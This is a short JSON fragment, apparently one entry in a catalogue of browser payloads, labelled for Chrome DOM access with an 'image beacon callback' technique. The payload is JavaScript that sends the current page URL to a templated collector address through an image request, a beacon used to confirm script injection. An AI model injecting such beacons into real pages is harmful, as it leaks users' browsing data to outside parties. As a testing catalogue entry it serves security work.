      "category": "dom_access",
      "browser": "chrome",
      "technique": "image_beacon_callback",
      "payload": "(function(){var base='{url}';var sep=base.indexOf('?')===-1?'?':'&';(new Image()).src=base+sep+'probe=chrome-image-beacon&href='+encodeURIComponent(String(location.href));})();",
